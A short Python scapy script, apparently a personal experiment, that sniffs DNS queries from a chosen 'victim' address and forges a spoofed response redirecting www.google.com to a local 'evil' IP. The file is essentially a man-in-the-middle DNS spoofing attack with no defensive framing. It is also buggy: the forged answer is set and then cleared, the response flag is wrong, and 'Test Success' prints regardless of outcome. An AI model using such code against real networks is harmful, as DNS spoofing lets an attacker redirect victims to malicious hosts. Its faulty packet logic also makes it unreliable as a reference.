from scapy.all import *

def dns_req_test() : #This is creating a Standard Query Response. qr=1 indicates that it is a response. an=DNSRR(rrname='www.google.com', rdata='8.8.8.8')
    dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
    # dns_packet2.show()
    send(dns_packet2)
    
def sniff_test() : 
    pkt = sniff(filter='host 8.8.8.8', count=1, prn=lambda x: x.show())
    pkt[DNS].qr = 1
    pkt.show()
    # pkt[IP].dst = '192.168.178.22'
    # pkt[DNS].an = DNSRR(rrname='www.google.com', rdata='8.8.8.8')
    # pkt.show()
    # send(pkt)
    
def sniffPKT(ipVictim, goodSite) :
    pkt = sniff(lfilter=lambda p: p.haslayer(UDP) and p.dport == 53, filter='host ' + ipVictim, count=1, prn=lambda x: x.show())
    if pkt[0][DNSQR].qname == goodSite :
        return pkt[0]
    else :
        return pkt[0]
    
def MIMspoofDNS(pkt, goodSite, evilSite) :
    EvilDNSResponse = IP() / UDP() / DNS()
    EvilDNSResponse[IP].dst = pkt[IP].src
    EvilDNSResponse[IP].src = pkt[IP].dst
    EvilDNSResponse[UDP].dport = pkt[UDP].sport
    EvilDNSResponse[UDP].sport = pkt[UDP].dport
    EvilDNSResponse[DNS].rd = pkt[DNS].rd
    EvilDNSResponse[DNS].qd = pkt[DNS].qd
    EvilDNSResponse[DNS].qr = 0
    EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
    EvilDNSResponse[DNS].an = None
    EvilDNSResponse.show()
    send(EvilDNSResponse)
    
def testSniffnExtract() :
    pkt = sniff(filter='host 8.8.8.8', session = IPSession, count=1, prn=lambda x: x.show())
    pkt[0].show()
    
    
def main() :
    dns_req_test()
    # testSniffnExtract()
    pkt = sniffPKT('8.8.8.8', 'www.google.com.')
    MIMspoofDNS(pkt, 'www.google.com', '192.168.178.23')
    print("Test Success")

main()
